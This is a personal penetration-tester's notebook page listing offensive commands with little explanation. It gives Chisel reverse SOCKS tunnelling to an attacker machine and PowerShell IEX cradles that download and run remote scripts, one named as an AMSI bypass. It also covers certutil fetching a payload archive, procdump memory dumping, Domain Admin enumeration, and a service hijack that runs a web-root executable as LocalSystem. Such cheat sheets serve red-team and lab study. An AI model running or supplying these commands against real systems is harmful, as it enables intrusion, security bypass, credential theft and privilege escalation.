---
permalink: /notebook/
title: "Notebook"
---

A page to collate the random snippits of information/commands/workflows I have collated over the years.


## Chisel SocksProxy

Attacker (Kali)
```bash
 chisel server -p 8080 -reverse 
 ```

Client
```bash
 chisel client 10.10.14.6:8080 R:8001:127.0.0.1:1337 
 chisel server -p 1337 —socks5 
 ```

Attacker (Kali)
```bash
 chisel client 127.0.0.1:8001 socks 
 ```


## Powershell
IEX
```powershell
powershell -command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.104:8080/amsibypass.ps1’);"
```

```powershell
.(Alias IE*)((New-Object Net.WebClient).DownloadString('http://secure.oauth.live/update.txt'))
```

RunAs
```powershell
powershell.exe   $username = XYZ; $password = PASS; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Invoke-Command -ComputerName localhost -ScriptBlock {whoami} -Credential $credential
```

## LOLBins
certutil
``` 
certutil.exe -urlcache -split -f http://10.10.14.8:8080/msf.zip C:/users/luke/documents/msf/zip
```

Prodump
```
\procdump.exe -ma -accepteula pid outfile.dmp
```

## AD Stuff
Active DA Accounts
```powershell
Get-ADGroupMember -identity "Domain Admins" -Server 10.20.253.124| foreach{ get-aduser $_ -Properties * | select SamAccountName, passwordlastset, passwordneverexpires, Enabled} | Where-Object {$_.Enabled -eq $true} | Format-Table SamAccountName -Autosize
```

Active Users
```powershell
Get-ADGroupMember -identity "Domain Users" -Server 192.168.16.240 | foreach{ get-aduser $_ -Properties * | select SamAccountName, passwordlastset, passwordneverexpires, Enabled} | Where-Object {$_.Enabled -eq $true} | Format-Table SamAccountName -Autosize
```

## Service Hijack
```bash
sc config servicename binpath= "cmd.exe /K C:\Inetpub\wwwroot\l.exe"
sc config servicename obj= ".\LocalSystem" password= ""
sc config servicename start= auto
sc qc servicename
```